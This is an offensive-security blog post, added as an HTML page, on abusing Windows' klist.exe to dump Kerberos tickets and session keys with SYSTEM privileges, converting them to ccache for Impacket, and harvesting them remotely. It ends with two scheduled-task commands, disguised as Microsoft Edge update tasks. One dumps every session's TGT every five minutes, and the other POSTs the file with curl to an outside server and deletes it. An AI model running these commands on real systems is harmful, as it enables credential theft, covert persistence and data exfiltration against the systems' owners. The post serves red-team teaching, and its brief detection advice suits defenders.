@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Abusing klist.exe for Kerberos Post-Exploitation – Jake Otte</title>
+    <meta name="description" content="Abusing Windows' native klist.exe binary to enumerate Kerberos tickets and extract credentials." />
+    <meta property="og:title" content="Abusing klist.exe for Kerberos Post-Exploitation – Jake Otte" />
+    <meta property="og:description" content="Abusing Windows' native klist.exe binary to enumerate Kerberos tickets and extract credentials." />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://jakeotte.com/posts/klist-lolbin.html" />
+    <meta property="og:image" content="https://jakeotte.com/assets/square.jpg" />
+    <meta property="og:site_name" content="Jake Otte" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Abusing klist.exe for Kerberos Post-Exploitation – Jake Otte" />
+    <meta name="twitter:description" content="Abusing Windows' native klist.exe binary to enumerate Kerberos tickets and extract credentials." />
+    <link rel="canonical" href="https://jakeotte.com/posts/klist-lolbin.html" />
+    <link rel="stylesheet" href="../style.css" />
+    <link rel="icon" href="../assets/img/favicons/favicon.ico" />
+</head>
+
+<body class="page">
+
+    <canvas id="bg-canvas"></canvas>
+
+    <header>
+        <div class="header-top">
+            <a class="brand" href="../index.html">
+                <h1>&gt; Jake Otte<span class="cursor"></span></h1>
+                <p class="tag">Offensive Security</p>
+            </a>
+            <nav class="nav">
+                <a href="../index.html">Home</a>
+                <a href="../about.html">About</a>
+                <a href="https://jotter.gitbook.io/red-team/" target="_blank">Notes</a>
+                <a href="../contact.html">Contact</a>
+            </nav>
+        </div>
+    </header>
+
+    <main id="post-main">
+        <div class="post-view-header">
+            <a href="../index.html" class="post-back-btn">← All Posts</a>
+            <span class="post-read-time">8 min read</span>
+        </div>
+        <div class="post-view-content">
+            <article class="post-article">
+                <h1>Abusing klist.exe for Kerberos Post-Exploitation</h1>
+                <p class="post-meta">March 10, 2026</p>
+                <div class="post-body"><p>Microsoft Windows ships with the program <code>klist.exe</code>, found in <code>C:\Windows\System32</code>. Technology and security professionals may be most familiar with the program’s default, parameter-less behavior of listing Kerberos tickets loaded in the current logon session. However, this behavior is just the surface of <code>klist</code>’s capabilities.</p>
+<blockquote>
+<p><img src="../assets/img/klist/help.png" alt="klist">
+<em>The klist binary help menu.</em></p>
+</blockquote>
+<h1>Extracting TGTs</h1>
+<p><code>klist</code> supports a variety of functions through parameters, including <code>purge</code>,<code>get</code>,<code>sessions</code>, and <code>tgt</code>. The latter two are of great interest to red team operations, as they seem to suggest potential for enumeration and post-exploitation. Indeed, executing <code>klist sessions</code> as a high-integrity Administrator-level process returns a list of active logon sessions:</p>
+<pre><code>C:\Windows\System32&gt;klist sessions
+
+Current LogonId is 0:0x15d6ed
+[0] Session 1 0:0x15d6ed LUMON\jotter Negotiate:Interactive
+[1] Session 1 0:0x154333 LUMON\jotter Kerberos:Interactive
+[2] Session 0 0:0x3e5 NT AUTHORITY\LOCAL SERVICE Negotiate:Service
+[3] Session 1 0:0x11ad7 Window Manager\DWM-1 Negotiate:Interactive
+[4] Session 1 0:0x11a78 Window Manager\DWM-1 Negotiate:Interactive
+[5] Session 0 0:0x3e4 LUMON\jotter-pc$ Negotiate:Service
+[6] Session 1 0:0xb248 Font Driver Host\UMFD-1 Negotiate:Interactive
+[7] Session 0 0:0xb23d Font Driver Host\UMFD-0 Negotiate:Interactive
+[8] Session 0 0:0xa748 \ NTLM:(0)
+[9] Session 0 0:0x3e7 LUMON\jotter-pc$ Negotiate:(0)
+</code></pre>
+<p>Similarly, executing <code>klist tgt</code> returns detailed information regarding our logon session’s assigned TGT, as well as a hex dump of the ticket itself:</p>
+<pre><code>C:\Windows\System32&gt;klist tgt
+
+Current LogonId is 0:0x154333
+
+Cached TGT:
+
+ServiceName        : krbtgt
+TargetName (SPN)   : krbtgt
+ClientName         : jotter
+DomainName         : LUMON.COM
+TargetDomainName   : LUMON.COM
+AltTargetDomainName: LUMON.COM
+Ticket Flags       : 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize
+Session Key        : KeyType 0x12 - AES-256-CTS-HMAC-SHA1-96
+                   : KeyLength 32 - 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+StartTime          : 3/6/2026 19:07:09 (local)
+EndTime            : 3/7/2026 5:07:09 (local)
+RenewUntil         : 3/13/2026 9:22:16 (local)
+TimeSkew           :  - 0:05 minute(s)
+EncodedTicket      : (size: 1162)
+0000  61 82 04 86 30 82 04 82:a0 03 02 01 05 a1 0c 1b  a...0...........
+0010  0a 4c 55 4d 4f 4e 2e 43:4f 4d a2 1f 30 1d a0 03  .LUMON.COM..0...
+0020  02 01 02 a1 16 30 14 1b:06 6b 72 62 74 67 74 1b  .....0...krbtgt.
+0030  0a 4c 55 4d 4f 4e 2e 43:4f 4d a3 82 04 46 30 82  .LUMON.COM...F0.
+</code></pre>
+<p>Unfortunately for us, the TGT’s session key has been zeroed out, preventing us from using the hex dump directly as credential material. However, all is not lost - investigating the binary’s source in Ghidra reveals an interesting set of operations following argument parsing. The program opens a handle to the current process token and calls <code>RtlAdjustPrivilege</code> with a privilege <code>7</code>, aka <code>SeTcbPrivilege</code>. In the event of a permissions failure (<code>0xc0000061</code>), the program falls back to a privilege <code>0x14</code>, <code>SeImpersonatePrivilege</code>.</p>
+<blockquote>
+<p><img src="../assets/img/klist/privs.png" alt="klist">
+<em>Upgrading process privileges if possible.</em></p>
+</blockquote>
+<p>Following execution further, we can identify the function responsible for interfacing with LSASS and “extracting” Kerberos tickets. Rather strangely, it seems that <code>klist.exe</code> dynamically imports and resolves <code>LsaCallAuthenticationPackage</code> at runtime (a LOLBIN with IAT camoflauge to boot).</p>
+<blockquote>
+<p><img src="../assets/img/klist/dynamic.png" alt="klist">
+<em>Dynamically importing secur32.dll and resolving LsaCallAuthenticationPackage.</em></p>
+</blockquote>
+<p>This call explains why the original <code>klist tgt</code> execution included a nulled session key; LSASS will scrub the session key for any requesting processes lacking <code>SeTcbPrivilege</code>.</p>
+<p>With some insight into the API calls behind <code>klist</code>, we can execute <code>klist tgt</code> as <code>NT AUTHORITY\SYSTEM</code> with <code>SeTcbPrivilege</code>. Doing so provides the full hex dump and uncensored session key for our machine account:</p>
+<pre><code>C:\Windows\System32&gt;klist tgt
+
+Current LogonId is 0:0x3e7
+
+Cached TGT:
+
+ServiceName        : krbtgt
+TargetName (SPN)   : krbtgt
+ClientName         : JOTTER-PC$
+DomainName         : LUMON.COM
+TargetDomainName   : LUMON.COM
+AltTargetDomainName: LUMON.COM
+Ticket Flags       : 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize
+Session Key        : KeyType 0x12 - AES-256-CTS-HMAC-SHA1-96
+                   : KeyLength 32 - 3f a2 7c 14 d9 05 eb 62 18 4a f3 91 cc 07 5e b8 29 d1 83 4f 76 aa 0e c5 51 38 9d f7 e4 62 1a 08
+StartTime          : 3/6/2026 19:07:09 (local)
+EndTime            : 3/7/2026 5:07:09 (local)
+RenewUntil         : 3/13/2026 9:22:16 (local)
+TimeSkew           :  - 0:05 minute(s)
+EncodedTicket      : (size: 1162)
+0000  61 82 04 86 30 82 04 82:a0 03 02 01 05 a1 0c 1b  a...0...........
+0010  0a 4c 55 4d 4f 4e 2e 43:4f 4d a2 1f 30 1d a0 03  .LUMON.COM..0...
+0020  02 01 02 a1 16 30 14 1b:06 6b 72 62 74 67 74 1b  .....0...krbtgt.
+0030  0a 4c 55 4d 4f 4e 2e 43:4f 4d a3 82 04 46 30 82  .LUMON.COM...F0.
+</code></pre>
+<p>What’s more, we can now target other logon sessions and extract their uncensored TGTs:</p>
+<pre><code>C:\Windows\System32&gt;klist tgt -li 0x154333
+
+Current LogonId is 0:0x3e7
+Targeted LogonId is 0:0x154333
+
+Cached TGT:
+
+ServiceName        : krbtgt
+TargetName (SPN)   : krbtgt
+ClientName         : jotter
+DomainName         : LUMON.COM
+TargetDomainName   : LUMON.COM
+AltTargetDomainName: LUMON.COM
+Ticket Flags       : 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize
+Session Key        : KeyType 0x12 - AES-256-CTS-HMAC-SHA1-96
+                   : KeyLength 32 - b7 4e 03 91 2d f8 56 a0 e3 7b 19 cc 84 3d 6f 27 05 c2 ae 48 fd 91 30 7e b3 5a d4 08 61 ff 2c 94
+StartTime          : 3/6/2026 19:07:09 (local)
+EndTime            : 3/7/2026 5:07:09 (local)
+RenewUntil         : 3/13/2026 9:22:16 (local)
+TimeSkew           :  - 0:05 minute(s)
+EncodedTicket      : (size: 1162)
+0000  61 82 04 86 30 82 04 82:a0 03 02 01 05 a1 0c 1b  a...0...........
+0010  0a 4c 55 4d 4f 4e 2e 43:4f 4d a2 1f 30 1d a0 03  .LUMON.COM..0...
+0020  02 01 02 a1 16 30 14 1b:06 6b 72 62 74 67 74 1b  .....0...krbtgt.
+0030  0a 4c 55 4d 4f 4e 2e 43:4f 4d a3 82 04 46 30 82  .LUMON.COM...F0.
+</code></pre>
+<h1>Klist to CCache</h1>
+<p>While an uncensored hex dump of a TGT and its session key seem like fantastic opportunities for post-exploitation, the format provided is not readily usable with available tooling. Most exploitation tools support Kerberos through the <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html">MIT Credential cache, or ccache</a>, format - including the Impacket library.</p>
+<p>Using Claude Code, I was able to create <a href="https://github.com/jakeotte/klist2ccache">a python script</a> that allows for the conversion of <code>klist tgt</code> output to ccache:</p>
+<pre><code>python klist2ccache.py -i tgt.txt
+
+[*] Parsed ticket:
+    client     : JOTTER-PC$@LUMON.COM
+    server     : krbtgt/LUMON.COM@LUMON.COM
+    key_type   : 18
+    key        : 74f62dc212216c910b&lt;SNIP&gt;dc964137c70fb8f476b22852db398
+    flags      : 0x40e10000
+    start_time : 2026-03-06 17:44:00+00:00
+    end_time   : 2026-03-07 03:44:00+00:00
+    renew_till : 2026-03-13 08:13:41+00:00
+    ticket     : 1229 bytes
+
+[+] ccache written → JOTTER-PC$@LUMON.COM.ccache  (1450 bytes)
+
+[*] Use with impacket:
+    export KRB5CCNAME=JOTTER-PC$@LUMON.COM.ccache
+    smbclient.py -k -no-pass &lt;domain&gt;/&lt;user&gt;@&lt;target&gt;
+</code></pre>
+<p>Provided command execution as <code>NT AUTHORITY\SYSTEM</code>, we can now opt out of using Rubeus for Microsoft’s own solution. I should also mention the existence of the <a href="https://github.com/apetro76/Klist2">PowerShell project <code>klist2</code></a>, a non-Windows-native binary that supports Kerberos ticket dumping even on credential guard enabled systems.</p>
+<h1>Dumping TGTs “Remotely”</h1>
+<p>As you can imagine, the flexibility of using a Windows LOLBIN for Kerberos ticket extraction is unparalelled. Perhaps one of the most annoying situations many pentesters find themselves in is Administrative-level permissions on a host loaded up with EDR, preventing significant malware deployment. While named pipes may support the extraction of SAM or parts of LSASS, touching disk with obfuscated Rubeus or another loader can raise alarms and quarantine machines, causing TGT extraction to become a headache.</p>
+<p>With <code>klist</code>, we can simply use SYSTEM-level command execution to accomplish the same task. While not as OPSEC-friendly as an RDP session and manual copy-paste, I created <a href="https://github.com/jakeotte/klist2ccache">a script</a> to use Scheduled Tasks (atexec, my personal preference) as <code>NT AUTHORITY\SYSTEM</code> to execute <code>klist tgt</code> for all Kerberos sessions, write the output to a file, and download the file over SMB.</p>
+<pre><code>&gt; python klistremote.py lumon.com/jotter@jotter-pc.lumon.com
+[*] Connecting to host ...
+[*] Running remote: klist sessions ...
+[*] Found 2 session(s) to dump:
+[*]   - LUMON\jotter  (LogonId 0x154333)
+[*]   - LUMON\jotter-pc$  (LogonId 0x3e4)
+[*] [1/2] LUMON\jotter (0x154333) ...
+[*]   -&gt; ./jotter@LUMON.COM.ccache
+[*] [2/2] LUMON\jotter-pc$ (0x3e4) ...
+[*]   -&gt; ./jotter-pc$@LUMON.COM.ccache
+[*]
+[*] Done. 2 ccache(s) written to .
+[*]
+[*] Use with impacket:
+[*]   export KRB5CCNAME=./jotter@LUMON.COM.ccache
+[*]   impacket-smbclient -k -no-pass LUMON/jotter@target
+</code></pre>
+<p>Afterwards, the output may be converted directly to ccache for use in further attacks. While this is a crude implementation, it does speed up the process of TGT extraction significantly over thick malware deployment.</p>
+<h1>Creating a “TGT Harvester” with LOLBINs</h1>
+<p>The logical extension of this example is long-running Scheduled Tasks as LOLBIN TGT harvesters. While a poor choice for evasion against human investigators, automated credential extraction using only Windows-native programs has the potential to be strong against poorly tuned EDRs and AV engines.</p>
+<p>Creating a scheduled task to write TGTs to an output file is simple enough:</p>
+<pre><code>schtasks /create /tn &quot;MicrosoftEdgeUpdateTaskMachine&quot; /tr &quot;cmd.exe /c klist sessions &gt; C:\Windows\Temp\s.txt &amp;&amp; for /f \&quot;tokens=4 delims= \&quot; %i in ('findstr /r \&quot;0x[0-9a-f]*\&quot; C:\Windows\Temp\s.txt') do klist tgt -li %i &gt;&gt; C:\Windows\Temp\tgt.txt&quot; /sc minute /mo 5 /ru SYSTEM /f
+</code></pre>
+<p>Creating an additional scheduled task to upload the output file to a server is just as easy with <code>curl</code>:</p>
+<pre><code>schtasks /create /tn &quot;MicrosoftEdgeUpdateTaskMachineUA&quot; /tr &quot;cmd.exe /c curl -s -X POST http://10.10.10.10:8080/harvest --data-binary @C:\Windows\Temp\tgt.txt -H \&quot;X-Host: %COMPUTERNAME%\&quot; &amp;&amp; del C:\Windows\Temp\tgt.txt&quot; /sc minute /mo 5 /st 00:01 /ru SYSTEM /f
+</code></pre>
+<p>The first task enumerates all active logon sessions and dumps each TGT to a staging file. The second task, offset by a minute, picks up the file and POSTs it to our server before cleaning up. Both tasks masquerade as Edge “update tasks” - <code>MicrosoftEdgeUpdateTaskMachine</code> and <code>MicrosoftEdgeUpdateTaskMachineUA</code> are real task names on a default Windows install with Edge present.</p>
+<h1>Conclusion</h1>
+<p><code>klist</code> is a surprisingly capable LOLBIN for Kerberos credential material extraction. Provided SYSTEM-level command execution - a reasonable assumption in many post-exploitation scenarios - it offers a native alternative to Rubeus for TGT dumping with a smaller tooling footprint.
+From a defensive standpoint, the obvious detection opportunity is <code>klist.exe</code> spawning from unusual parents or being invoked with <code>tgt -li</code> against arbitrary logon IDs. Scheduled tasks running as SYSTEM that invoke klist should be considered immediately suspicious on any production host.</p>
+</div>
+            </article>
+            <div class="post-nav">
+            <a href="splashtop-c2.html" class="post-nav-link post-nav-prev">
+                <span class="post-nav-dir">← Older</span>
+                <span class="post-nav-title">No More Implants: User's Guide to Splashtop C2</span>
+            </a>
+            <span></span>
+        </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-inner">
+            <div class="footer-left">
+                <div class="footer-nav">
+                    <a href="../index.html">Home</a>
+                    <a href="../about.html">About</a>
+                    <a href="https://jotter.gitbook.io/red-team/" target="_blank">Notes</a>
+                    <a href="../contact.html">Contact</a>
+                    <a href="https://github.com/jakeotte" target="_blank">GitHub</a>
+                </div>
+                <p class="copyright">© 2026 Jake Otte — Offensive Security</p>
+            </div>
+        </div>
+    </footer>
+
+    <div id="reading-progress"></div>
+
+    <script>
+    const bar = document.getElementById('reading-progress');
+    window.addEventListener('scroll', () => {
+        const h = document.documentElement.scrollHeight - window.innerHeight;
+        bar.style.width = (h > 0 ? (window.scrollY / h) * 100 : 0) + '%';
+    }, { passive: true });
+    </script>
+
+    <script defer src="../script.js"></script>
+</body>
+</html>
